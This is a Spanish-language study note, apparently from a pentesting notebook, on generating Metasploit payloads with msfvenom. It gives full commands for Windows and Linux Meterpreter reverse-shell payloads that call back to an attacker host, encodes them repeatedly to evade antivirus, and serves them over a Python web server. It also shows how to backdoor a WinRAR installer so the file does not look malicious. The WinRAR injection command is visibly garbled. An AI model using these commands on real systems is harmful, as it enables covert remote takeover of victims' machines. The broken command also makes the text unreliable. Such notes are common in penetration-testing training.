Msfvenom es una herramienta incluida en el marco de trabajo Metasploit, que es una plataforma ampliamente utilizada para realizar pruebas de penetración y desarrollo de exploits. Msfvenom es una herramienta de línea de comandos que se utiliza para generar payloads (cargas útiles) que pueden ser utilizados en ataques de seguridad informática. Estos payloads pueden ser diseñados para realizar una variedad de acciones maliciosas, como tomar el control de un sistema, obtener acceso a datos confidenciales o establecer conexiones inversas para permitir el acceso remoto al sistema objetivo.

Msfvenom es altamente personalizable y permite a los usuarios especificar una amplia gama de opciones, como el tipo de payload a generar, el tipo de arquitectura del sistema destino, la codificación de la carga útil para evadir la detección de antivirus, entre otras cosas. Es una herramienta poderosa que puede ser utilizada tanto con fines ofensivos como defensivos en el ámbito de la seguridad informática.

# Comandos msfvenom
![[Pasted image 20240307133121.png]]

# Listar payloads
msfvenom --list payload

# Listar formatos
msfvenom --list formats

# Listar codificadores
msfvenom --list encoders
![[Pasted image 20240503083555.png]]
## Generar payload con Msfvenom

msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe › /home/kali/Desktop/Windows_Payloads/payloadx86. exe
El siguiente comando hace lo siguiente:
- `-a x86`: Esto especifica la arquitectura del payload, en este caso, `x86`, que es para sistemas de 32 bits.
- `-p windows/meterpreter/reverse_tcp`: Esto especifica el tipo de payload a generar. En este caso, se está utilizando `windows/meterpreter/reverse_tcp`, que es un payload diseñado para ejecutar un shell Meterpreter en sistemas Windows y establecer una conexión de shell inversa (`reverse_tcp`) hacia la dirección IP y puerto especificados.
- `LHOST=10.10.10.5`: Esto establece la dirección IP del host receptor (la máquina atacante) al que se conectará el shell inverso. En este caso, la dirección IP es `10.10.10.5`.
- `LPORT=1234`: Esto establece el puerto al que el shell inverso intentará conectarse en la máquina atacante. En este caso, el puerto es `1234`.
- `-f exe`: Esto especifica el formato de salida del payload generado, que en este caso es un archivo ejecutable de Windows (`exe`).
- `› /home/kali/Desktop/Windows_Payloads/payloadx86.exe`: Esto redirige la salida del comando a un archivo llamado `payloadx86.exe` en la ubicación `/home/kali/Desktop/Windows_Payloads/` en el sistema de archivos de la máquina desde donde se está ejecutando el comando.
![[Pasted image 20240325183428.png]]


## Crear servidor python para cargar payloads

sudo python -m SimpleHTTPServer 80
![[Pasted image 20240325183326.png]]

python 3 -m http.server 80
![[Pasted image 20240503084038.png]]


Una vez inciado el servidor y cargados los archivos faltaran dos cosas, la primera poner nuestra maquina en escucha, para ello podemos usar netcat o en este caso usaremos el modulo de metasploit `explot/multi/handler`
![[Pasted image 20240325183738.png]]

Con la carga ya creada y nuestro ordenador de oyente unicamente nos queda ejecutar el payload desde la maquina victima, para ello bastaria con acceder al navegador y escribir nuestra direccion para que encontrase nuestro server
![[Pasted image 20240325183909.png]]



## Codificar cargas payloads con msfconsole
### Codificar payload Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
![[Pasted image 20240325185314.png]]

### Codificar payload windows con itinieración para saltar antivirus
### Codificar payload Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_Payloads/encodedx86.exe
![[Pasted image 20240325185818.png]]


### Codificar payload Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf › ~/Desktop/Linux Payloads/encodedx86
![[Pasted image 20240325185915.png]]

## Injectar payload en archivo ejecutable windows
Primero tendremos que descargarnos el ejecutable el cual injectaremos el payload, en este caso hemos utilizado winrar, una vez descargado generamos la carga
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 p/Windows_Payloads/winrar.exe
![[Pasted image 20240325190506.png]]

Ahora ejecutamos el servidor de python como antes y unicamente queda descargar en la maquina victima el archivo winrar con el payload, como se puede ver no parece malicioso
![[Pasted image 20240325190814.png]]